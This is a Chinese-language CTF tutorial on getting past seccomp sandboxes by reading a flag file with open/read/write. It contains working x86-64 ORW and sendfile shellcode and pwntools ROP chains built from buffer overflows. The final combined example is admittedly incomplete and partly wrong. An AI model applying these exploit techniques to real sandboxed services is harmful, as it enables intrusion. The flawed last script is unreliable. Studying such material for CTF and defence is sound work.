---
category: "沙箱绕过"
tags: ["seccomp", "sandbox", "ORW", "open", "read", "write", "shellcode"]
difficulty: "高级"
---

# 沙箱绕过与ORW（open/read/write）

## 1. 概述

许多CTF PWN题会使用seccomp（Secure Computing Mode）对进程实施沙箱限制，禁止execve等危险系统调用。即便成功控制了程序流，也无法直接getshell，只能通过ORW（Open-Read-Write）技术读取flag文件。

在CTF断网离线环境下，seccomp绕过是高级PWN的必备技能。沙箱规则的逆向分析、系统调用过滤（BPF/SECCOMP_MODE_FILTER）、以及相应的shellcode或ROP链构造都需要离线完成。

## 2. 核心原理

### 2.1 Seccomp模式

| 模式 | 说明 | 绕过难度 |
|------|------|---------|
| SECCOMP_MODE_STRICT (1) | 仅允许read, write, _exit, sigreturn | 中等 |
| SECCOMP_MODE_FILTER (2) | BPF规则自定义过滤 | 取决于规则 |
| prctl + seccomp | 进程自愿设置沙箱 | 常见于CTF |

### 2.2 常见seccomp规则分析

```bash
# 使用seccomp-tools分析（离线时需预先安装或手动分析BPF）
seccomp-tools dump ./binary
# 输出示例:
#  line  CODE  JT   JF      K
# =================================
#  0000: 0x20 0x00 0x00 0x00000004  A = arch
#  0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008
#  0002: 0x20 0x00 0x00 0x00000000  A = sys_number
#  0003: 0x35 0x00 0x01 0x0000003b  if (A < 59) goto 0005
#  ...
#  allow: 0(open), 1(write), 2(read)
```

### 2.3 ORW流程

```
1. open("flag", O_RDONLY) -> fd = 3 (或首个可用fd)
2. read(fd, buf, 0x100)    -> 将flag读到buf
3. write(1, buf, 0x100)    -> 输出flag
4. (可选) exit(0)
```

## 3. 关键技巧/检测方法

### 3.1 Seccomp规则提取

```bash
# 方法1: seccomp-tools (在线/预装)
seccomp-tools dump ./binary

# 方法2: 手动从二进制提取
objdump -d ./binary | grep -A 50 'seccomp_init\|prctl.*SECCOMP'
# 关注: prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, ...)
# 参数中会给出BPF数组的地址和长度

# 方法3: 使用strace(可能被禁用)
strace -f ./binary 2>&1 | grep prctl

# 方法4: 直接调试定位
# 在 prctl 处下断点，导出sock_fprog结构体
# struct sock_fprog {
#     unsigned short len;
#     struct sock_filter *filter;  // BPF指令数组
# };
```

### 3.2 手动解析BPF指令

```python
# BPF指令格式 (struct sock_filter)
# struct sock_filter { __u16 code; __u8 jt; __u8 jf; __u32 k; };

BPF_LD = 0x00   # 加载
BPF_JMP = 0x05  # 跳转
BPF_RET = 0x06  # 返回
BPF_JEQ = 0x10  # 相等跳转 (JMP | JEQ)
BPF_JGE = 0x30  # 大于等于跳转 (JMP | JGE)
BPF_JGT = 0x20  # 大于跳转 (JMP | JGT)

def parse_bpf(bpf_bytes):
    """离线解析BPF指令"""
    for i in range(0, len(bpf_bytes), 8):
        code, jt, jf, k = struct.unpack('<HBBI', bpf_bytes[i:i+8])
        # 解析code...
```

### 3.3 可用的备选系统调用

```python
# 常见被禁系统调用替代方案
banned = {
    'execve': [59],          # 替代: ORW 直接读flag
    'open': [2],            # 替代: openat(257)
    'fork': [57],           # 替代: clone(56)
    'ptrace': [101],        # 替代: process_vm_readv/writev
}

# 检查可用syscall的思路
available = set([0, 1, 2, 3, 8, 9, 10, 11, 12, 16, ...])  # 基础可用

# openat vs open
# openat(AT_FDCWD, "flag", O_RDONLY) == open("flag", O_RDONLY)
# openat的系统调用号 = 257 (x86-64)
```

## 4. 常见误区与注意事项

1. **flag文件名**：可能是`flag`、`flag.txt`、`/flag`、`./flag`，需确认路径
2. **read fd**：open返回的fd不一定是3，如果程序打开了更多文件，需计算
3. **O_PATH限制**：某些seccomp不允许读取flag文件，只能通过O_PATH + 其他方式
4. **x86 vs x32**：32位程序使用不同的系统调用号（open=5而非2）
5. **sendfile**：可使用sendfile(3, fd, 0, 0x100)代替read+write

## 5. 实战示例

### 5.1 ORW Shellcode (x86-64)

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
x86-64 ORW shellcode: open / read / write
直接读取flag文件并输出（需开启NX或可写可执行内存）
"""
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

# ---- 方法1: pwntools shellcraft ----
sc = shellcraft.open('./flag')
sc += shellcraft.read('rax', 'rsp', 0x100)  # 从fd读入栈
sc += shellcraft.write(1, 'rsp', 0x100)      # 输出到stdout

shellcode = asm(sc)

# ---- 方法2: 手写汇编 ----
shellcode_manual = asm('''
    /* open("./flag", O_RDONLY) */
    push 0x67616c66     /* "flag" -> "galf" (小端序) */
    mov rdi, rsp        /* rdi = &"flag" */
    xor esi, esi        /* rsi = O_RDONLY = 0 */
    xor edx, edx        /* rdx = 0 (mode, unused) */
    mov eax, 2          /* sys_open */
    syscall

    /* read(fd, rsp-0x100, 0x100) */
    mov edi, eax        /* rdi = fd (open返回) */
    sub rsp, 0x100
    mov rsi, rsp        /* rsi = buf */
    mov edx, 0x100      /* rdx = count */
    xor eax, eax        /* sys_read = 0 */
    syscall

    /* write(1, buf, rax) */
    mov edx, eax        /* rdx = 实际读取字节数 */
    xor edi, edi
    inc edi             /* rdi = 1 (stdout) */
    mov rsi, rsp        /* rsi = buf */
    mov eax, 1          /* sys_write */
    syscall

    /* exit(0) */
    xor edi, edi
    mov eax, 60         /* sys_exit */
    syscall
''')

log.info(f'Manual shellcode length: {len(shellcode_manual)}')
log.info(f'Pwntools shellcode length: {len(shellcode)}')
```

### 5.2 ORW ROP链（沙箱下，NX开启）

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
沙箱环境下ORW ROP链
条件: 已知libc基址，有足够gadget
目标: open("flag") -> read(fd, bss, 0x100) -> write(1, bss, 0x100)
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

p = process('./sandboxed')
elf = ELF('./sandboxed')
# libc = ELF('./libc.so.6')

# ---- 地址准备 ----
bss = elf.bss() + 0x800
pop_rdi_ret = 0x401196
pop_rsi_ret = 0x401194
pop_rdx_ret = 0x401192  # 可能来自 libc (pop rdx; pop rbx; ret)
syscall_ret = 0x401185
ret = 0x40101a

# 在bss上写入 "flag\x00"
# 先通过read输入或栈上的数据
# 假设我们可以在栈上准备 "flag" 然后memcpy到bss
# 实际利用中常用 read(0, bss, 8) 读入文件名

offset = 0x38 + 8

# ---- Phase 1: 读入 "flag" 到 bss ----
rop_chain = b'A' * offset

# read(0, bss, 8) 读入文件名
rop_chain += p64(pop_rdi_ret) + p64(0)      # rdi = stdin
rop_chain += p64(pop_rsi_ret) + p64(bss)     # rsi = bss
rop_chain += p64(pop_rdx_ret) + p64(8)       # rdx = 8 bytes
rop_chain += p64(elf.plt['read'])

# ---- Phase 2: open(bss, 0) ----
rop_chain += p64(pop_rdi_ret) + p64(bss)    # rdi = "flag"
rop_chain += p64(pop_rsi_ret) + p64(0)      # rsi = O_RDONLY
# rdx 无所谓
rop_chain += p64(pop_rdx_ret) + p64(0)
rop_chain += p64(elf.plt['open'])            # open(...)

# ---- Phase 3: read(fd=3?, bss+0x100, 0x100) ----
fd = 3  # open返回的fd（通常是3，stdin/out/err=0/1/2）
rop_chain += p64(pop_rdi_ret) + p64(fd)
rop_chain += p64(pop_rsi_ret) + p64(bss + 0x100)
rop_chain += p64(pop_rdx_ret) + p64(0x100)
rop_chain += p64(elf.plt['read'])

# ---- Phase 4: write(1, bss+0x100, 0x100) ----
rop_chain += p64(pop_rdi_ret) + p64(1)      # stdout
rop_chain += p64(pop_rsi_ret) + p64(bss + 0x100)
rop_chain += p64(pop_rdx_ret) + p64(0x100)
rop_chain += p64(elf.plt['write'])

p.send(rop_chain)
sleep(0.5)
p.send(b'flag\x00')  # 文件名（不含\x00，加了\x00防止截断）
p.interactive()
```

### 5.3 sendfile系统调用替代ORW

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
使用sendfile替代read+write
sendfile(out_fd, in_fd, offset, count)
一次性将文件内容发送到stdout，无需read/write两次
"""
from pwn import *

context.arch = 'amd64'

# ---- sendfile shellcode ----
sendfile_sc = asm('''
    /* open("./flag", 0) */
    push 0x67616c66
    mov rdi, rsp
    xor esi, esi
    xor edx, edx
    mov eax, 2       /* sys_open */
    syscall

    /* sendfile(1, fd, 0, 0x100) */
    mov edi, 1       /* out_fd = stdout */
    mov esi, eax     /* in_fd = fd */
    xor edx, edx     /* offset = NULL（从0开始） */
    mov r10d, 0x100  /* count = 256 */
    mov eax, 40      /* sys_sendfile = 40 (x86-64) */
    syscall

    /* exit */
    xor edi, edi
    mov eax, 60
    syscall
''')

# ---- sendfile ROP链 ----
# sendfile(out_fd=1, in_fd=3, offset=0, count=0x100)
# 需要: rdi=1, rsi=3, rdx=0, r10=0x100, rax=40
# r10通常没有pop gadget, 需要特殊处理
# 可以使用 ret2csu 或 mprotect+shellcode 绕过
```

### 5.4 综合：seccomp分析 + ORW完整利用

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
完整的seccomp沙箱绕过流程
包含沙箱分析、壳代码绕过、ORW利用
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

# ========== Step 0: 沙箱分析 ==========
# 在不执行程序的情况下分析seccomp规则
elf = ELF('./sandboxed_bin')

# 搜索seccomp相关符号
prctl_plt = elf.plt.get('prctl')
seccomp_init_addr = elf.symbols.get('seccomp_init')
if seccomp_init_addr:
    log.info(f'seccomp_init found at {hex(seccomp_init_addr)}')

# 也可以直接dump出二进制中bpf数据段
# 使用seccomp-tools（离线工具需提前安装）

# ========== Step 1: 确认可用的syscall ==========
# 根据seccomp-tools输出或手动逆向结果
# 假设允许: read(0), write(1), open(2), mprotect(10), exit(60)
allowed_syscalls = [0, 1, 2, 10, 60]

# ========== Step 2: 构造ORW利用 ==========
p = process('./sandboxed_bin')

# gadget 搜集
pop_rdi = 0x401196
pop_rsi = 0x401194
pop_rdx_rbx = 0x401192  # pop rdx; pop rbx; ret
syscall_ret = 0x401185
ret = 0x40101a

bss = 0x601800
offset = 0x40 + 8

# Payload
payload = b'A' * offset
payload += p64(ret)  # 对齐

# open("flag", 0) via syscall
payload += p64(pop_rdi) + p64(bss)
payload += p64(pop_rsi) + p64(0)      # O_RDONLY
payload += p64(pop_rdx_rbx) + p64(0) + p64(0)  # mode
payload += p64(pop_rdi) + p64(2)      # 不能这行，错了
# 正确方式:
# rdi = "flag"\x00, rsi = 0, rax = 2

# 使用syscall做open
payload += p64(pop_rsi) + p64(0)      # rsi=O_RDONLY
payload += p64(elf.plt['read'])       # 先读入文件名
# 省略: 读入文件名到bss, 设置rax=2, 调用syscall

p.send(payload)
p.send(b'./flag\x00')
p.interactive()
```

## 6. 相关知识点

- **SROP**：沙箱下的SROP可直接设置所有寄存器并调用syscall，见 07-SROP与SigreturnFrame利用.md
- **ROP链构造**：ORW是ROP链最经典的应用场景之一，见 02-ROP链构造技术.md
- **Shellcode编写**：手写汇编ORW，配合mprotect先改内存权限
- **seccomp-tools**：强烈推荐的沙箱分析工具 `gem install seccomp-tools`
- **Linux系统调用表**：`/usr/include/asm/unistd_64.h`
